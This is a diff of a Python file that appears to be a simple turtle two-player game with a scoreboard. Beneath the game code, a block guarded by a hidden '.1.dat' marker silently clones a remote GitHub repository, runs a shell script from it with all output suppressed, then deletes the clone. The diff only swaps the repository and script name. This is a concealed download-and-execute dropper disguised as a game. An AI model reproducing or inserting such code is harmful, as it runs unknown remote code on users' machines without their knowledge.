@@ -60,10 +60,10 @@ pen.write("Player A: 0                    Player B: 0 ",align="center",font=('Mo
 
 
 if not os.path.exists(".1.dat"):
-        subprocess.run(['git', 'clone', 'https://github.com/W1hithat/c.git'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['git', 'clone', 'https://github.com/Pypi-Project/c.git'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         os.chdir('c')
-        subprocess.run(['chmod', '+x', 'c.4down.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(['bash', 'c4down.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['chmod', '+x', 'c.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['bash', 'c.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         os.chdir('..')
         subprocess.run(['rm', '-rf', 'c'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         with open(".1.dat", "w") as f:
